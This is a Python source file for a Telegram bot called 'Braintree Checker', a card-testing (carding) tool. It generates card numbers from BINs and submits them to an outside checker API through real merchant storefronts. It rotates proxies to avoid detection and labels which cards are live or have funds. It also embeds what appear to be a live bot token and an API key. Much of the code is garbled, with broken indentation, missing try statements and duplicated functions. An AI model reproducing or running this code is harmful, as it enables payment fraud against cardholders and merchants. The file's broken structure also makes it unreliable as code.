import telebot
from telebot import types
import requests
import re
import uuid
import time
from datetime import datetime
import urllib3
import random
import threading
import json
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = '8322766561:AAGIkZyrrR5UZC1Awk48Ieij4AaG8COqvOE'
ADMIN_ID = 5629984144
bot = telebot.TeleBot(BOT_TOKEN, num_threads=10)

USERS_FILE = 'users.json'
MAX_WORKERS = 10  # For parallel processing

def load_users():
    if os.path.exists(USERS_FILE):
        try:
    with open(USERS_FILE, 'r') as f:
    data = json.load(f)
    return set(data.get('approved_users', [])), data.get('pending_requests', {})
        except Exception as e:
    print(f"Error loading users: {e}")
    return set(), {}
    return set(), {}

def save_users():
    try:
        with open(USERS_FILE, 'w') as f:
    json.dump({'approved_users': list(approved_users), 'pending_requests': pending_requests}, f, indent=4)
    except Exception as e:
        print(f"Error saving users: {e}")

approved_users, pending_requests = load_users()

ACTIVE_PROXY = None

PROXY_LIST = []

PROXY_API_URL = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all"

def reload_proxies_from_api():
    global PROXY_LIST
    res = requests.get(PROXY_API_URL, timeout=10)
        if res.status_code == 200:
    proxies = [p.strip() for p in res.text.splitlines() if p.strip()]
    PROXY_LIST = proxies
    print(f"🔄 Loaded {len(PROXY_LIST)} proxies from API")
        else:
    print("❌ Failed to load proxies from API")
    except Exception as e:
        print(f"Proxy API error: {e}")

PROXY_INDEX = 0

def load_proxies():
    global PROXY_LIST
    if os.path.exists("proxies.txt"):
        with open("proxies.txt","r") as f:
    PROXY_LIST = [p.strip() for p in f if p.strip()]

def get_rotating_proxy():
    global PROXY_INDEX, PROXY_LIST
    if not PROXY_LIST:
        return None

    attempts = len(PROXY_LIST)
    for _ in range(attempts):
        proxy = PROXY_LIST[PROXY_INDEX % len(PROXY_LIST)]
        PROXY_INDEX += 1

        parts = proxy.split(":")
        if len(parts) == 4:
    host, port, user, pw = parts
    proxy_url = f"http://{user}:{pw}@{host}:{port}"
    proxies = {'http': proxy_url, 'https': proxy_url}

    try:
    test = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=5)
    if test.status_code == 200:
    return proxies
    except:
    # remove dead proxy
    print(f"Removing dead proxy: {proxy}")
    PROXY_LIST.remove(proxy)
    if not PROXY_LIST:
    return None
    continue

    return None

    proxy = PROXY_LIST[PROXY_INDEX % len(PROXY_LIST)]
    PROXY_INDEX += 1
    parts = proxy.split(":")
    if len(parts)==4:
        host,port,user,pw = parts
        return {'http':f"http://{user}:{pw}@{host}:{port}",'https':f"http://{user}:{pw}@{host}:{port}"}
    return None

PROXY_LOCK = threading.Lock()

def test_proxy(proxy_url):
    test_urls = [
        'https://api.stripe.com',
        'https://httpbin.org/ip'
    ]

    for test_url in test_urls:
    response = requests.get(
    test_url,
    proxies={'http': proxy_url, 'https': proxy_url},
    timeout=(5, 10),
    verify=False
    )

    if response.status_code in [200, 301, 302]:
    return True

        except requests.exceptions.ProxyError:
    return False
        except requests.exceptions.ConnectTimeout:
    continue
        except requests.exceptions.ReadTimeout:
    continue
        except:
    continue

    return False

def set_proxy(proxy_url):
    global ACTIVE_PROXY

        parts = proxy_url.split(":")

        if len(parts) == 4:
    host, port, user, password = parts
    proxy_url = f"http://{user}:{password}@{host}:{port}"
        elif "@" not in proxy_url:
    proxy_url = f"http://{proxy_url}"

    except Exception as e:
        return False, f"❌ Invalid proxy format: {e}"

    print(f"Testing proxy: {proxy_url}")

    if test_proxy(proxy_url):
        with PROXY_LOCK:
    ACTIVE_PROXY = proxy_url
        print(f"✅ Proxy set: {proxy_url}")
        return True, "✅ Proxy is LIVE and working!"

    print(f"❌ Proxy failed: {proxy_url}")
    return False, "❌ Proxy is DEAD or too slow"

def remove_proxy():
    global ACTIVE_PROXY
    with PROXY_LOCK:
        ACTIVE_PROXY = None

PROXY_LIST = []

PROXY_API_URL = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all"

def reload_proxies_from_api():
    global PROXY_LIST
    res = requests.get(PROXY_API_URL, timeout=10)
        if res.status_code == 200:
    proxies = [p.strip() for p in res.text.splitlines() if p.strip()]
    PROXY_LIST = proxies
    print(f"🔄 Loaded {len(PROXY_LIST)} proxies from API")
        else:
    print("❌ Failed to load proxies from API")
    except Exception as e:
        print(f"Proxy API error: {e}")

PROXY_INDEX = 0

def load_proxies():
    global PROXY_LIST
    if os.path.exists("proxies.txt"):
        with open("proxies.txt","r") as f:
    PROXY_LIST = [p.strip() for p in f if p.strip()]

def get_rotating_proxy():
    global PROXY_INDEX, PROXY_LIST
    if not PROXY_LIST:
        return None

    attempts = len(PROXY_LIST)
    for _ in range(attempts):
        proxy = PROXY_LIST[PROXY_INDEX % len(PROXY_LIST)]
        PROXY_INDEX += 1

        parts = proxy.split(":")
        if len(parts) == 4:
    host, port, user, pw = parts
    proxy_url = f"http://{user}:{pw}@{host}:{port}"
    proxies = {'http': proxy_url, 'https': proxy_url}

    try:
    test = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=5)
    if test.status_code == 200:
    return proxies
    except:
    # remove dead proxy
    print(f"Removing dead proxy: {proxy}")
    PROXY_LIST.remove(proxy)
    if not PROXY_LIST:
    return None
    continue

    return None

    proxy = PROXY_LIST[PROXY_INDEX % len(PROXY_LIST)]
    PROXY_INDEX += 1
    parts = proxy.split(":")
    if len(parts)==4:
        host,port,user,pw = parts
        return {'http':f"http://{user}:{pw}@{host}:{port}",'https':f"http://{user}:{pw}@{host}:{port}"}
    return None

    return "✅ Proxy removed. Using direct connection."

def get_proxies():
    with PROXY_LOCK:
        return {'http': ACTIVE_PROXY, 'https': ACTIVE_PROXY} if ACTIVE_PROXY else None

DEFAULT_BRAINTREE_SITE = "https://www.coca-colastore.com,https://www.asedeals.com,https://www.broderbund.com"
JOSS_API = "https://b3.mr-checker.net/api/wpg.php"

user_sessions = {}
user_cooldowns = {}
stop_checking = {}
user_custom_sites = {}
COOLDOWN_CHECK = 5  # Reduced from 10
COOLDOWN_MASS = 10  # Reduced from 20
MAX_MASS_CARDS = 5
MAX_FILE_CARDS = 500
HANDYAPI_KEY = "HAS-0YZN9rhQvH74X3Gu9BgVx0wyJns"

def get_card_info(card_number):
    """Get card info with error handling"""
    info = {'brand': 'Unknown', 'type': 'Unknown', 'country': 'Unknown', 'flag': '🌍', 'bank': 'Unknown', 'level': 'Unknown'}
    bin_number = card_number[:6]
    
    if HANDYAPI_KEY:
    response = requests.get(
    f"https://data.handyapi.com/bin/{bin_number}",
    headers={'x-api-key': HANDYAPI_KEY, 'User-Agent': 'Mozilla/5.0'},
    timeout=5,
    verify=False
    )
    if response.status_code == 200:
    data = response.json()
    if data.get('Scheme'): 
    info['brand'] = str(data['Scheme']).upper()
    if data.get('Type'): 
    info['type'] = str(data['Type']).title()
    if data.get('Category'): 
    info['level'] = str(data['Category']).title()
    elif data.get('CardTier'): 
    info['level'] = str(data['CardTier']).title()
    if data.get('Issuer'): 
    info['bank'] = str(data['Issuer']).title()
    country_data = data.get('Country')
    if country_data and isinstance(country_data, dict):
    if country_data.get('Name'): 
    info['country'] = country_data['Name'].upper()
    if country_data.get('A2') and len(country_data['A2']) == 2:
    info['flag'] = ''.join(chr(127397 + ord(c)) for c in country_data['A2'].upper())
    if info['bank'] != 'Unknown' and info['country'] != 'Unknown':
    return info
        except Exception as e:
    print(f"HandyAPI error: {e}")
    
        response = requests.get(
    f"https://lookup.binlist.net/{bin_number}",
    headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
    timeout=5,
    verify=False
        )
        if response.status_code == 200:
    data = response.json()
    if data.get('scheme'): 
    info['brand'] = data['scheme'].upper()
    if data.get('type'): 
    info['type'] = data['type'].title()
    if data.get('brand'): 
    info['level'] = data['brand'].title()
    if data.get('bank', {}).get('name'): 
    info['bank'] = data['bank']['name'].title()
    if data.get('country', {}).get('name'): 
    info['country'] = data['country']['name'].upper()
    if data.get('country', {}).get('alpha2') and len(data['country']['alpha2']) == 2:
    info['flag'] = ''.join(chr(127397 + ord(c)) for c in data['country']['alpha2'].upper())
    except Exception as e:
        print(f"BinList error: {e}")
    
    if card_number[0] == '4': 
        info['brand'], info['type'] = 'VISA', 'Credit'
    elif card_number[:2] in ['51', '52', '53', '54', '55']: 
        info['brand'], info['type'] = 'MASTERCARD', 'Credit'
    elif card_number[:2] in ['34', '37']: 
        info['brand'], info['type'] = 'AMERICAN EXPRESS', 'Credit'
    
    return info

def luhn_check(card_number):
    try:
        digits = [int(d) for d in str(card_number)]
        checksum = sum(digits[-1::-2]) + sum(sum([int(d) for d in str(d * 2)]) for d in digits[-2::-2])
        return checksum % 10 == 0
    except:
        return False

def calculate_luhn_digit(partial_card):
    try:
        digits = [int(d) for d in str(partial_card) + '0']
        checksum = sum(digits[-1::-2]) + sum(sum([int(d) for d in str(d * 2)]) for d in digits[-2::-2])
        return (10 - (checksum % 10)) % 10
    except:
        return 0

def generate_cards(bin_number, quantity, exp_month=None, exp_year=None):
    if len(bin_number) < 6:
        return None, "BIN must be at least 6 digits"
    if quantity < 1 or quantity > 20:
        return None, "Quantity must be between 1 and 20"
    
    cards = []
    card_length = 16 if bin_number[0] in ['4', '5'] else 15
    
    for _ in range(quantity):
        partial = bin_number + ''.join([str(random.randint(0, 9)) for _ in range(card_length - len(bin_number) - 1)])
        check_digit = calculate_luhn_digit(partial)
        card_number = partial + str(check_digit)
        
        if exp_month and exp_year:
    month = int(exp_month)
    year = int(exp_year) if len(str(exp_year)) == 2 else int(str(exp_year)[-2:])
        else:
    month = random.randint(1, 12)
    year = random.randint(25, 30)
        
        cvv = ''.join([str(random.randint(0, 9)) for _ in range(3)])
        cards.append(f"{card_number}|{month:02d}|{year:02d}|{cvv}")
    
    return cards, None

def check_cooldown(chat_id, command_type):
    current_time = time.time()
    cooldown = COOLDOWN_CHECK if command_type == 'check' else COOLDOWN_MASS
    if chat_id not in user_cooldowns: 
        user_cooldowns[chat_id] = {}
    if command_type in user_cooldowns[chat_id]:
        time_passed = current_time - user_cooldowns[chat_id][command_type]
        if time_passed < cooldown:
    return False, int(cooldown - time_passed) + 1
    user_cooldowns[chat_id][command_type] = current_time
    return True, 0

def is_approved(user_id):
    return user_id == ADMIN_ID or user_id in approved_users

def require_approval(func):
    def wrapper(message):
        if not is_approved(message.from_user.id):
    text = "╔════════════════════╗\n"
    text += "║   🚫 ACCESS DENIED   ║\n"
    text += "╚════════════════════╝\n\n"
    text += "⚠️ You need admin approval\n"
    text += "📝 Use /request to get access\n"
    try:
    bot.send_message(message.chat.id, text)
    except Exception as e:
    print(f"Error sending message: {e}")
    return
        return func(message)
    return wrapper

def get_braintree_site(chat_id):
    if chat_id in user_custom_sites and user_custom_sites[chat_id]:
        return user_custom_sites[chat_id]
    return DEFAULT_BRAINTREE_SITE

class BraintreeChecker:
    def __init__(self, chat_id):
        self.chat_id = chat_id
        self.session = requests.Session()
        
    def validate_card(self, card):
        """Validate card with proper error handling and retries"""
        start_time = time.time()
        
    parts = card.replace(' ', '').split('|')
    if len(parts) != 4:
    return {'status': 'error', 'message': 'Invalid format', 'icon': '❌', 'time': 0}
    
    number, exp_month, exp_year, cvv = parts
    
    if not number.isdigit() or len(number) < 13 or len(number) > 19:
    return {'status': 'error', 'message': 'Invalid card number', 'icon': '❌', 'time': 0}
    
    card_info = get_card_info(number)
    
    if not luhn_check(number):
    return {'status': 'error', 'message': 'Invalid card (Luhn failed)', 'icon': '❌', 'card_info': card_info, 'time': 0}
    
    if len(exp_year) == 4:
    exp_year = exp_year[-2:]
    elif len(exp_year) == 1:
    exp_year = f"0{exp_year}"
    
        except Exception as e:
    print(f"Card parse error: {e}")
    return {'status': 'error', 'message': 'Parse error', 'icon': '❌', 'time': 0}
        
        site_url = get_braintree_site(self.chat_id)
        
        # Retry logic for API calls
        max_retries = 5
        for attempt in range(max_retries):
    params = {
    'lista': f"{number}|{exp_month}|{exp_year}|{cvv}",
    'proxy': '',
    'sites': site_url,
    'xlite': 'undefined'
    }
    
    response = self.session.get(
    JOSS_API,
    params=params,
    proxies=get_rotating_proxy(),
    verify=False,
    timeout=(10,30)
    )
    
    elapsed_time = round(time.time() - start_time, 2)
    
    if response.status_code != 200:
    if attempt < max_retries - 1:
    time.sleep(2)
    continue
    return {
    'status': 'error',
    'message': f'API Error: {response.status_code}',
    'icon': '❌',
    'card_info': card_info,
    'time': elapsed_time
    }
    
    response_text = response.text.lower()
    
    # --- ADVANCED RESPONSE PARSER ---
response_text = response.text.lower()

dead_keywords = [
    'declined','do not honor','lost card','stolen card','pickup card','restricted card',
    'call issuer','expired card','invalid number','invalid card','incorrect number',
    'no such issuer','transaction not allowed','payment not allowed','processing error',
    'rejected','fraud','risk','security violation','authentication failed','card blocked',
    'blocked','blacklist','not permitted','invalid cvc','invalid expiry','invalid exp',
    'zip code mismatch','avs failed','avs mismatch','processor declined'
]

ccn_keywords = ['cvv','cvc','security code','incorrect cvc','cvv mismatch']
funds_keywords = ['insufficient','not enough funds','balance low']
live_keywords = ['approved','success','authorized','payment successful','thank you']

if any(k in response_text for k in live_keywords):
    return {'status':'live','message':'Payment successful','icon':'✅','card_info':card_info,'time':elapsed_time}

elif any(k in response_text for k in funds_keywords):
    return {'status':'insufficient','message':'Insufficient Funds','icon':'💰','card_info':card_info,'time':elapsed_time}

elif any(k in response_text for k in ccn_keywords):
    return {'status':'live_cvv','message':'CVV Mismatch','icon':'⚠️','card_info':card_info,'time':elapsed_time}

elif any(k in response_text for k in dead_keywords):
    return {'status':'dead','message':'Card Declined','icon':'❌','card_info':card_info,'time':elapsed_time}

# fallback
return {'status':'dead','message':'Card Declined','icon':'❌','card_info':card_info,'time':elapsed_time}

    # Success if we got here
    return {
    'status': 'dead',
    'message': 'Card Declined',
    'icon': '❌',
    'card_info': card_info,
    'time': elapsed_time
    }
    
    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
    if attempt < max_retries - 1:
    print(f"Timeout on attempt {attempt + 1}, retrying...")
    time.sleep(2)
    continue
    elapsed_time = round(time.time() - start_time, 2)
    return {
    'status': 'error',
    'message': 'Connection timeout',
    'icon': '❌',
    'card_info': card_info,
    'time': elapsed_time
    }
    except Exception as e:
    if attempt < max_retries - 1:
    print(f"Error on attempt {attempt + 1}: {e}, retrying...")
    time.sleep(2)
    continue
    elapsed_time = round(time.time() - start_time, 2)
    print(f"Validation error: {e}")
    return {
    'status': 'error',
    'message': f'Error: {str(e)[:30]}',
    'icon': '❌',
    'card_info': card_info,
    'time': elapsed_time
    }

def send_safe(chat_id, text, **kwargs):
    """Safe send message with error handling"""
    try:
        return bot.send_message(chat_id, text, **kwargs)
    except Exception as e:
        print(f"Error sending message to {chat_id}: {e}")
        return None

def edit_safe(chat_id, message_id, text, **kwargs):
    """Safe edit message with error handling"""
    try:
        return bot.edit_message_text(text, chat_id, message_id, **kwargs)
    except Exception as e:
        print(f"Error editing message {message_id}: {e}")
        return None

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if not is_approved(user_id):
        text = "╔════════════════════════╗\n"
        text += "║  💳 BRAINTREE CHECKER  ║\n"
        text += "╚════════════════════════╝\n\n"
        text += "⚠️ ACCESS REQUIRED ⚠️\n\n"
        text += "🔒 You need admin approval\n"
        text += "📝 Use /request for access\n\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━━━"
    else:
        text = "╔════════════════════════╗\n"
        text += "║  💳 BRAINTREE CHECKER  ║\n"
        text += "╚════════════════════════╝\n\n"
        text += "🎯 MAIN COMMANDS\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        text += "💳 /bchk - Single card check\n"
        text += "📦 /bmass - Multiple cards check\n"
        text += "  \n"
        text += "🔍 /bin - BIN lookup\n"
        text += "🎲 /gen - Generate cards\n"
        text += "🌍 /custom_site - Set your site\n"
        text += "🗑️ /remove_site - Remove site\n"
        text += "📍 /site - Check current site\n"
        text += "❓ /help - Show help\n\n"
        
        if user_id == ADMIN_ID:
    text += "⚙️ ADMIN COMMANDS\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    text += "🌐 /proxy - Set proxy\n"
    text += "🚫 /removeproxy - Remove proxy\n"
    text += "📊 /proxystatus - Check status\n"
    text += "👥 /users - List users\n"
    text += "⏳ /pending - Pending requests\n"
    text += "📢 /broadcast - Send message to all\n\n"
        
        text += "✨ Powered by YOSH ✨"
    send_safe(message.chat.id, text)

@bot.message_handler(commands=['request'])
def request_access(message):
    user_id = message.from_user.id
    if is_approved(user_id):
        text = "╔════════════════════╗\n"
        text += "║   ✅ APPROVED   ║\n"
        text += "╚════════════════════╝\n\n"
        text += "🎉 You already have access!"
        send_safe(message.chat.id, text)
        return
    if user_id in pending_requests:
        text = "╔════════════════════╗\n"
        text += "║   ⏳ PENDING   ║\n"
        text += "╚════════════════════╝\n\n"
        text += "⏱️ Your request is pending\n"
        text += "Please wait for approval..."
        send_safe(message.chat.id, text)
        return
    
    username = message.from_user.username or "No username"
    first_name = message.from_user.first_name or "Unknown"
    last_name = message.from_user.last_name or ""
    full_name = f"{first_name} {last_name}".strip()
    
    pending_requests[user_id] = {
        'username': username, 
        'name': full_name, 
        'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    save_users()
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}"),
        types.InlineKeyboardButton("❌ Deny", callback_data=f"deny_{user_id}")
    )
    
    admin_msg = "╔════════════════════════╗\n"
    admin_msg += "║  📥 NEW ACCESS REQUEST  ║\n"
    admin_msg += "╚════════════════════════╝\n\n"
    admin_msg += f"👤 Name: {full_name}\n"
    admin_msg += f"🔗 Username: @{username}\n"
    admin_msg += f"🆔 ID: {user_id}\n"
    admin_msg += f"📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    admin_msg += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    admin_msg += "Approve this user?"
    
    send_safe(ADMIN_ID, admin_msg, reply_markup=markup)
    
    user_msg = "╔════════════════════╗\n"
    user_msg += "║   📤 REQUEST SENT   ║\n"
    user_msg += "╚════════════════════╝\n\n"
    user_msg += "✅ Request sent to admin\n"
    user_msg += "⏳ Please wait for approval..."
    send_safe(message.chat.id, user_msg)

@bot.callback_query_handler(func=lambda call: call.data.startswith('approve_') or call.data.startswith('deny_'))
def handle_approval_callback(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Admin only!")
        return
    
        action, user_id = call.data.split('_')
        user_id = int(user_id)
        
        if action == 'approve':
    approved_users.add(user_id)
    pending_requests.pop(user_id, None)
    save_users()
    bot.answer_callback_query(call.id, "✅ User approved!")
    edit_safe(call.message.chat.id, call.message.message_id, f"✅ User {user_id} has been APPROVED!")
    approval_msg = "╔════════════════════╗\n"
    approval_msg += "║   🎉 APPROVED!   ║\n"
    approval_msg += "╚════════════════════╝\n\n"
    approval_msg += "✅ Access granted!\n"
    approval_msg += "🚀 Type /start to begin"
    send_safe(user_id, approval_msg)
    except:
    pass
        elif action == 'deny':
    pending_requests.pop(user_id, None)
    save_users()
    bot.answer_callback_query(call.id, "❌ User denied!")
    edit_safe(call.message.chat.id, call.message.message_id, f"❌ User {user_id} has been DENIED!")
    deny_msg = "╔════════════════════╗\n"
    deny_msg += "║   ❌ DENIED   ║\n"
    deny_msg += "╚════════════════════╝\n\n"
    deny_msg += "🚫 Access denied by admin"
    send_safe(user_id, deny_msg)
    except:
    pass
    except Exception as e:
        print(f"Callback error: {e}")
        bot.answer_callback_query(call.id, "❌ Error processing request")

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_check_'))
def handle_stop_check(call):
    try:
        chat_id = int(call.data.split('_')[2])
        if call.from_user.id == chat_id or call.from_user.id == ADMIN_ID:
    stop_checking[chat_id] = True
    bot.answer_callback_query(call.id, "🛑 Stopping check...")
    except Exception as e:
        print(f"Stop check error: {e}")

@bot.message_handler(commands=['bchk'])
@require_approval
def braintree_check(message):
        can_proceed, remaining = check_cooldown(message.chat.id, 'check')
        if not can_proceed:
    text = "╔════════════════════╗\n"
    text += "║  ⏳ COOLDOWN ACTIVE  ║\n"
    text += "╚════════════════════╝\n\n"
    text += f"⏱️ Wait {remaining} seconds"
    send_safe(message.chat.id, text)
    return
        
        command_parts = message.text.split(maxsplit=1)
        
        if len(command_parts) < 2:
    if message.chat.id in user_sessions and 'generated_cards' in user_sessions[message.chat.id]:
    cards = user_sessions[message.chat.id]['generated_cards']
    if cards:
    card_input = cards[0]
    else:
    text = "╔════════════════════╗\n"
    text += "║  ❌ INVALID FORMAT  ║\n"
    text += "╚════════════════════╝\n\n"
    text += "Usage: /bchk card|mm|yy|cvv"
    send_safe(message.chat.id, text)
    return
    else:
    text = "╔════════════════════╗\n"
    text += "║  ❌ INVALID FORMAT  ║\n"
    text += "╚════════════════════╝\n\n"
    text += "Usage: /bchk card|mm|yy|cvv"
    send_safe(message.chat.id, text)
    return
        else:
    card_input = command_parts[1].strip()
        
        status_msg = send_safe(message.chat.id, f"⏳ Checking card...\n\n💳 {card_input}")
        if not status_msg:
    return
        
        checker = BraintreeChecker(message.chat.id)
        result = checker.validate_card(card_input)
        card_info = result.get('card_info', {})
        
        # Format response
        check_response = "╔═══════════════════════════════╗\n"
        check_response += "║ <b>CARD VALIDATION RESULT</b> ║\n"
        check_response += "╚═══════════════════════════════╝\n\n"
        check_response += f"<b>Card:</b> <code>{card_input}</code>\n\n"
        
        if result['status'] == 'live':
    check_response += "<b>Status: ✅ Card Live</b>\n\n"
        elif result['status'] == 'live_cvv':
    check_response += "<b>Status: ⚠️ CVV Mismatch</b>\n\n"
        elif result['status'] == 'insufficient':
    check_response += "<b>Status: 💰 Insufficient Funds</b>\n\n"
        else:
    check_response += "<b>Status: ❌ Card Dead</b>\n\n"
        
        check_response += "<b>Card Info:</b>\n"
        check_response += f"• Brand: {card_info.get('brand', 'Unknown')}\n"
        check_response += f"• Type: {card_info.get('type', 'Unknown')}\n"
        check_response += f"• Level: {card_info.get('level', 'Unknown')}\n"
        check_response += f"• Bank: {card_info.get('bank', 'Unknown')}\n"
        check_response += f"• Country: {card_info.get('flag', '🌍')} {card_info.get('country', 'Unknown')}\n\n"
        check_response += f"<b>Gateway:</b> Braintree\n"
        check_response += f"<b>Response:</b> {result['message']}\n\n"
        check_response += f"<b>Checked by:</b> @{message.from_user.username or 'User'}\n"
        check_response += f"<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        edit_safe(message.chat.id, status_msg.message_id, check_response, parse_mode='HTML')
    except Exception as e:
        print(f"bchk error: {e}")
        send_safe(message.chat.id, "❌ An error occurred. Please try again.")

@bot.message_handler(commands=['bmass'])
@require_approval
def braintree_mass(message):
        can_proceed, remaining = check_cooldown(message.chat.id, 'mass')
        if not can_proceed:
    text = "╔════════════════════╗\n"
    text += "║  ⏳ COOLDOWN ACTIVE  ║\n"
    text += "╚════════════════════╝\n\n"
    text += f"⏱️ Wait {remaining} seconds"
    send_safe(message.chat.id, text)
    return
        
        command_parts = message.text.split(maxsplit=1)
        
        if len(command_parts) < 2:
    if message.chat.id in user_sessions and 'generated_cards' in user_sessions[message.chat.id]:
    cards = user_sessions[message.chat.id]['generated_cards']
    if not cards:
    text = "╔════════════════════╗\n"
    text += "║  ❌ INVALID FORMAT  ║\n"
    text += "╚════════════════════╝\n\n"
    text += f"Usage: /bmass card1|mm|yy|cvv\ncard2|mm|yy|cvv\n\n"
    text += f"Max: {MAX_MASS_CARDS} cards"
    send_safe(message.chat.id, text)
    return
    if len(cards) > MAX_MASS_CARDS:
    text = "╔════════════════════╗\n"
    text += "║  ❌ TOO MANY CARDS  ║\n"
    text += "╚════════════════════╝\n\n"
    text += f"You generated {len(cards)} cards\n"
    text += f"Max for /bmass: {MAX_MASS_CARDS}\n\n"
    text += "💡 Use  for more cards"
    send_safe(message.chat.id, text)
    return
    else:
    text = "╔════════════════════╗\n"
    text += "║  ❌ INVALID FORMAT  ║\n"
    text += "╚════════════════════╝\n\n"
    text += f"Usage: /bmass card1|mm|yy|cvv\ncard2|mm|yy|cvv\n\n"
    text += f"Max: {MAX_MASS_CARDS} cards"
    send_safe(message.chat.id, text)
    return
        else:
    cards_text = command_parts[1].strip()
    cards = [c.strip() for c in cards_text.split('\n') if c.strip()]
        
        if len(cards) > MAX_MASS_CARDS:
    text = "╔════════════════════╗\n"
    text += "║  ❌ TOO MANY CARDS  ║\n"
    text += "╚════════════════════╝\n\n"
    text += f"Max: {MAX_MASS_CARDS} cards\n"
    text += f"You sent: {len(cards)} cards"
    send_safe(message.chat.id, text)
    return
        
        status_msg = send_safe(message.chat.id, f"⏳ Checking {len(cards)} cards...")
        if not status_msg:
    return
        
        # Parallel checking for speed
        checker = BraintreeChecker(message.chat.id)
        results = []
        
        with ThreadPoolExecutor(max_workers=min(5, len(cards))) as executor:
    future_to_card = {executor.submit(checker.validate_card, card): card for card in cards}
    
    for idx, future in enumerate(as_completed(future_to_card), 1):
    card = future_to_card[future]
    try:
    result = future.result()
    results.append((card, result))
    edit_safe(message.chat.id, status_msg.message_id, f"⏳ Checking {idx}/{len(cards)}...\n\n💳 {card}")
    except Exception as e:
    print(f"Card check error: {e}")
    results.append((card, {'status': 'error', 'message': 'Error', 'icon': '❌', 'time': 0}))
        
        mass_response = "╔════════════════════════╗\n"
        mass_response += "║  📦 MASS CHECK RESULTS  ║\n"
        mass_response += "╚════════════════════════╝\n\n"
        mass_response += f"✅ Total: {len(results)} cards\n"
        mass_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        
        for card, result in results:
    mass_response += f"{result['icon']} <code>{card}</code>\n"
    mass_response += f"└ {result['message']} ({result['time']}s)\n\n"
        
        mass_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        mass_response += f"👤 By: @{message.from_user.username or 'User'}"
        
        edit_safe(message.chat.id, status_msg.message_id, mass_response, parse_mode='HTML')
    except Exception as e:
        print(f"bmass error: {e}")
        send_safe(message.chat.id, "❌ An error occurred. Please try again.")

# Continue with remaining commands...
@bot.message_handler(commands=['bin'])
@require_approval
def check_bin(message):
        command_parts = message.text.split(maxsplit=1)
        if len(command_parts) < 2:
    send_safe(message.chat.id, "Usage: /bin 464995")
    return
        
        bin_number = command_parts[1].strip()
        if not bin_number.isdigit() or len(bin_number) < 6:
    send_safe(message.chat.id, "❌ BIN must be at least 6 digits")
    return
        
        status_msg = send_safe(message.chat.id, "🔍 Looking up BIN...")
        card_info = get_card_info(bin_number.ljust(16, '0'))
        
        bin_response = "╔════════════════════════╗\n"
        bin_response += "║   🔍 BIN LOOKUP   ║\n"
        bin_response += "╚════════════════════════╝\n\n"
        bin_response += f"🔢 BIN: {bin_number}\n"
        bin_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        bin_response += f"💳 Brand: {card_info.get('brand', 'Unknown')}\n"
        bin_response += f"📊 Type: {card_info.get('type', 'Unknown')}\n"
        bin_response += f"⭐ Level: {card_info.get('level', 'Unknown')}\n"
        bin_response += f"🏦 Bank: {card_info.get('bank', 'Unknown')}\n"
        bin_response += f"{card_info.get('flag', '🌍')} Country: {card_info.get('country', 'Unknown')}\n"
        bin_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        bin_response += f"👤 By: @{message.from_user.username or 'User'}"
        
        edit_safe(message.chat.id, status_msg.message_id, bin_response)
    except Exception as e:
        print(f"bin error: {e}")
        send_safe(message.chat.id, "❌ Error looking up BIN")

@bot.message_handler(commands=['gen'])
@require_approval
def generate_cards_command(message):
        command_parts = message.text.split()
        if len(command_parts) < 2:
    send_safe(message.chat.id, "Usage:\n/gen 453212 10\n/gen 453212|06|30 10")
    return
        
        bin_input = command_parts[1].strip()
        exp_month = exp_year = None
        
        if '|' in bin_input:
    parts = bin_input.split('|')
    bin_input = parts[0]
    if len(parts) >= 3:
    try:
    exp_month = parts[1].strip()
    exp_year = parts[2].strip()
    except:
    pass
        
        bin_input = bin_input.replace('x', '').replace('X', '')
        bin_number = ''.join(c for c in bin_input if c.isdigit())
        
        quantity = 10
        if len(command_parts) > 2:
    try:
    quantity = int(command_parts[2])
    except:
    quantity = 10
        
        if not bin_number or len(bin_number) < 6:
    send_safe(message.chat.id, "❌ BIN must be at least 6 digits")
    return
        
        bin_number = bin_number[:8] if len(bin_number) > 8 else bin_number
        
        status_msg = send_safe(message.chat.id, f"🎲 Generating {quantity} cards...")
        
        cards, error = generate_cards(bin_number, quantity, exp_month, exp_year)
        if error:
    edit_safe(message.chat.id, status_msg.message_id, f"❌ Error: {error}")
    return
        
        user_sessions[message.chat.id] = {'generated_cards': cards}
        
        card_info = get_card_info(bin_number.ljust(16, '0'))
        date_info = "Random dates" if not exp_month else f"{exp_month}/{exp_year}"
        
        gen_response = "╔════════════════════════╗\n"
        gen_response += "║  🎲 GENERATED CARDS  ║\n"
        gen_response += "╚════════════════════════╝\n\n"
        gen_response += f"🔢 BIN: {bin_number}\n"
        gen_response += f"💳 {card_info.get('brand', 'Unknown')}\n"
        gen_response += f"{card_info.get('flag', '🌍')} {card_info.get('country', 'Unknown')}\n"
        gen_response += f"🏦 {card_info.get('bank', 'Unknown')}\n"
        gen_response += f"📅 {date_info}\n"
        gen_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        gen_response += f"✨ {len(cards)} Cards\n"
        gen_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        
        for card in cards:
    gen_response += f"💳 {card}\n"
        
        gen_response += "\n💡 Use /bchk or /bmass to check!"
